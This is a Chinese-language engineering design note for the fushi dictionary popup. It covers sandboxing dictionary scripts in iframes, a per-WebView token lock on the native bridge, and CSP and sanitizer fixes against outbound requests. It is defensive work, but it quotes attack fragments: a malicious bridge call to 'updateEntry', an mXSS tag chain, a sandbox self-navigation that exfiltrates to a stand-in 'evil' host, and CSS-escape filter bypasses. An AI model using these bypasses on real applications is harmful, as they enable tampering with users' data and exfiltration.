# 词典脚本沙箱 + 原生桥锁定（BUG-3762 / BUG-3765）

> 2026-10-23 所有者拍板：词典自带脚本保留，但必须跑在沙箱里，碰不到原生桥。

## 问题

查词弹窗（`fushi/assets/popup/popup.js` + `dict-media.js`）把词典 HTML 原样 `innerHTML` 进主文档，
`runDictScripts` 用 `new Function` 在主 frame 执行词典 `<script>`，window 代理对未知属性回落真 window，
于是恶意词典能 `window.flutter_inappwebview.callHandler('updateEntry', …)` 改写任意 Anki 卡、批量制卡、外联。

只把脚本挪进 `<iframe sandbox="allow-scripts" srcdoc>`（无 `allow-same-origin`）**不够**：

- Android：桥是 `addJavascriptInterface`，**所有 frame**（含沙箱 iframe）都拿得到 `flutter_inappwebview._callHandler`，原生不校验调用方。
- iOS / macOS：桥脚本 `forMainFrameOnly: false`，`messageHandlers` 所有 frame 可用。
- Linux：桥脚本默认注入所有 frame，`_bridgeSecret` 是脚本字面量，`_isMainFrame` 读了不用。
- Windows：WebView2 子 frame 的 `chrome.webview.postMessage` 是否进顶层 `WebMessageReceived` 待实测；原生收端不校验来源。

而桥**不能全局只认主 frame**：内置浏览器 / 网页流媒体等页面有合法的子 frame 调桥。所以锁定是**按页面显式开启**的。

## JS ↔ 原生契约：桥锁定（bridge lock）

各平台 vendored inappwebview 插件实现同一套语义：

1. **锁定请求**：页面在顶层 frame 调 `window.flutter_inappwebview.callHandler('_fushiLockBridge')`。
   这个名字由**桥脚本自己**拦截处理，不会分发到 app 注册的 handler。
2. **生成令牌**：原生为该 WebView 生成 ≥128 bit 随机令牌并保存，回传给**发起锁定的那个 frame 的桥脚本**。
   桥脚本把令牌存在闭包里（不挂到 window 上），然后把 Promise resolve 成字符串
   **`'fushi-bridge-locked-v1'`**（不用 `true`：没实现锁定的宿主适配器可能对未知 handler 回 true / null，
   页面只认这个专用值，其余一律当「未锁定」→ 不跑词典脚本）。
3. **锁定后**：该 WebView 收到的每一次 JS→原生调用（含插件内部 handler，如 `callAsyncJavaScript`）都必须带正确令牌，
   否则原生**丢弃并记一条 warn 日志**，不分发、不回调。桥脚本的 `callHandler` 包装自动附带令牌；
   插件内部若有绕过包装直接调原生入口的脚本，要改走同一个附令牌的内部函数。
4. **已锁定时再请求锁定**：拒绝（resolve `false`），保持原令牌。

其它加载 popup.js 的宿主（Android `PopupDictActivity` 的 `androidBridge`、macOS `GlobalLookupOverlay`、
浏览器扩展）暂不实现锁定：它们对 `_fushiLockBridge` 回不出专用值，页面就不执行词典脚本，安全降级。
5. **解锁**：顶层 frame 开始新的导航 / 新文档提交时清空令牌（回到未锁定 = 旧行为）。子 frame 导航不影响。
6. **未锁定**：行为与改动前完全一致（其它页面零影响）。
7. **能拿到发送方 frame 信息的平台额外校验**：iOS / macOS 的 `WKScriptMessage.frameInfo.isMainFrame`、
   Windows 的 `WebMessageReceivedEventArgs::get_Source` 等——锁定后非顶层 frame 的消息一律丢弃（令牌之外的第二道）。

为什么令牌在 Android 上管用：沙箱 iframe 是不透明 origin，读不到顶层 frame 的 JS 闭包；它能调到 Java 接口对象，
但拿不出令牌。为什么时序安全：页面在渲染任何词典内容**之前**完成锁定（见下），恶意内容出现时桥已锁。

## 页面侧（popup.js）

- 平台就绪后先锁桥；**锁定成功之前不挂载任何词典沙箱 iframe**（挂载排队等 `bridgeLocked` Promise）。
  锁定失败（插件旧、平台不支持）→ 词典脚本不执行，只渲染净化后的静态内容。
- 结构化内容（Yomitan structured-content）标签 / 属性白名单，`on*`、`javascript:`、`srcdoc` 等一律不出。
- 不含 `<script>` 的 HTML 释义：净化后留在主文档（去 `on*` / 危险标签 / `javascript:` URL），交互照旧。
- 含 `<script>` 的 HTML 释义：整块放进 `<iframe sandbox="allow-scripts" srcdoc>`，脚本源码由父页面
  经 `getDictAsset` 取回后内联进 srcdoc；iframe 内由我们注入的小脚本把高度、链接点击、点词查词经
  `postMessage` 交给父页面，父页面按 `event.source` 认 iframe、按白名单处理消息。
- 浏览器扩展（content script 上下文）不执行词典脚本，只渲染净化后的静态内容。

## 外联（BUG-3765）

在**内容层**切断，不在原生拦截器一刀切：弹窗 WebView 自己会 `new Audio(远程 URL)` 播在线发音
（JapanesePod101 等），拦截器拦掉所有 http(s) 会把这条合法路径一起拦死。

- 词典 CSS（styles.css、内联 `<style>`、`style` 属性）的 `@import` 整条删、外部 `url()` 换空。
- 结构化内容 `style` 值含 `url(` / `image-set(` / `expression(` 的整项丢弃。
- HTML 释义里会被浏览器自动请求的属性（`src` / `srcset` / `poster` / `background` …）指向外部地址的删掉；
  `<a href="https://…">` 保留（用户点了才经 `openLink` 打开）。
- 沙箱 iframe 自带 CSP：`default-src 'none'`、`connect-src 'none'`，图片 / 字体 / 媒体只认 `image:` / `dictmedia:` / `data:`。

## 第二轮：独立审查后补的三条（2026-10-23）

独立审查在真 Chrome 里复现了三类绕过，第一版的判断「主文档靠净化兜住、可以不加 CSP」不成立：

1. **mXSS**：净化器在 `<template>` 里净化后序列化成串、再 `innerHTML` 解析回主文档，两次解析上下文不同，
   `<math><mtext><table><mglyph><style><img onerror>` 在第二次解析时复活，主文档 JS 带着令牌调到 `updateEntry`
   ——桥锁定对主文档无效。导出卡片（`tempDiv.innerHTML = sanitizeHtml(…)`）与数组字符串释义
   （`sanitizeInlineHtml` → `appendRichTextLine`）是同一个毛病。
   → 净化与链接改写都在惰性树上做，`document.importNode` 直挂，全程不再序列化后重解析；math / svg 整个命名空间丢弃；
   `rewriteDictLinksInTree` 是两份 dict-media.js 分叉各自的 DOM 版（扩展分叉保留 token 占位语义）。
2. **沙箱自导航外联**：`location.href = 'https://evil/?w=…'`——srcdoc 里的 meta CSP 管不到导航后的新文档。
   → 主文档 CSP `frame-src 'none'` 在**请求发出前**拦（srcdoc 不是网络导航，不受影响）；iframe 再挂嵌入方 `csp` 属性；
   `load` 第二次触发即移除 frame。实测只有 frame-src 能挡住请求本身，后两道只管导航后的文档与消息。
3. **内容层外联过滤被绕过**：CSS 转义 `\75rl(` / `@\69mport`、`image-set('…')`、`imagesrcset`、`.mdd` 里原样返回的样式表。
   → 主文档 CSP（popup.js 加载时插入 meta，覆盖所有加载它的宿主；浏览器扩展里跳过，不能往别人的网页塞 CSP）：
   `img-src` / `font-src` / `style-src` 只认本机来源（`'self' image: dictmedia: data: blob: file: fushi-popup:
   https://fushi.local https://hibiki.popup`）。**`media-src` 额外放行 http(s)**：桌面 / iOS 的在线词条发音就是
   弹窗里 `new Audio(远程 URL)` 播的，只有 Android 交原生播放器；词典内容没有发起媒体请求的通路（净化器删媒体元素的外部
   `src`，CSS 载不了媒体）。

## 已知未做 / 降级

- **主文档 CSP 不管 `script-src`**：Windows / iOS 内联注入 `<script>`、其余平台走 `file://` / 自定义 scheme，
  没有真机覆盖就收紧脚本来源可能让弹窗在某个平台整页白屏。主文档脚本由「惰性树净化 + DOM 直挂」兜住。
- **WebKit 不认 iframe `csp` 属性**（Chromium 专有）：iOS / macOS / Linux 上沙箱自导航只靠主文档 `frame-src`。
- **未实现锁定的宿主不跑词典脚本**：Android `PopupDictActivity`（`androidBridge`）、macOS `GlobalLookupOverlay`、
  浏览器扩展。这些表面上依赖脚本的 MDX 词典只显示静态内容。
- **bfcache 恢复**：原生已清令牌、页面桥闭包仍持旧令牌。页面在 `pagehide` 拆掉全部沙箱，恢复后再锁会被拒，
  不再挂新沙箱（偏安全侧）。
- **沙箱内的交互是简化版**：点词只取点击处所在文本节点（最多 20 字），不走主文档 selection.js 的跨节点扫描；
  复制、键盘导航、瀑布流测高不进 iframe。只影响带脚本的 MDX 词条。

## 验证

- 各平台：锁定前后各发一次子 frame 调用，锁定后必须被丢弃；未锁定页面行为不变。
- 词典：带脚本的 MDX 条目在沙箱里照常渲染、点链接 / 点词能查；恶意条目调桥无效。
